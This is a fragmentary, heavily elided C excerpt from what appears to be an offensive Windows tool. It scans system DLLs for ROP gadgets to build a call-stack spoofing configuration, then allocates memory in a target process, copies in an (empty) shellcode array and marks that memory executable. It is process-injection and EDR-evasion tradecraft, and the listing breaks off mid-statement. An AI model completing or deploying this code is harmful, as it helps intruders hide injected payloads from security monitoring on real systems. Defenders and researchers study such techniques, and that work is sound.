...
void main_main(int argc, char* argv[]) {
    ...
    BYTE bigAddRspPattern[]   = { 0x48, 0x81, 0xc4, 0x38, 0x15, 0x0, 0x0, 0xc3 };
    ...
    while (sConfig->PopRdxGadget == NULL) {
		...
		if (dllIndex > 6)
			break;
        SearchGadget(baseDlls[dllIndex], popRdxPattern, sizeof(popRdxPattern), &sConfig->PopRdxGadget);
        dllIndex++;
    }
    ...
    SearchGadget(ntdllBase, popRegsPattern, sizeof(popRegsPattern), &sConfig->PopRegsGadget);
    SearchGadget(ntdllBase, addRsp0x28Pattern, sizeof(addRsp0x28Pattern), &sConfig->AddRsp28Gadget);
    SearchGadget(ntdllBase, movRspR11Pattern, sizeof(movRspR11Pattern), &sConfig->MovRspR11Gadget);

    sConfig->SuperAddRspGadgetSize = 0x1538;
    PVOID localGadget;
    SearchGadget(kernelBase, bigAddRspPattern, sizeof(bigAddRspPattern), &localGadget);
    ...
    printf("ADD RSP, 1538h Gadget: 0x%I64x\n", sConfig->SuperAddRspGadget);
    ...
    unsigned char shellcode[] = {
            
    };
    ...
    LPVOID mem = PICVirtualAllocEx(pHandle, length, PAGE_READWRITE);
    PICCopyMemory(pHandle, mem, shellcode, length);

    if (!PICVirtualProtectEx(pHandle, mem, length, PAGE_EXECUTE_READWRITE)) {
		printf("[-] Failed to set memory protection: %08x\n", GetLastError());
        return;
    }

    LPVOID rwmem = PICVirtualAllocEx(pHandle, sizeof(SPOOFER), PAGE_READWRITE);
        ...
        for (UINT64 j = (UINT64)moduleBase + pRuntimeFunctionTable[i].BeginAddress; j < (UINT64)moduleBase + pRuntimeFunctionTable[i].EndAddress; j++) {
            ...
            if (
                (
                    ...
                    *(WORD*)j == JMP_PTR_RBX && gadgetType == 0)
                || (
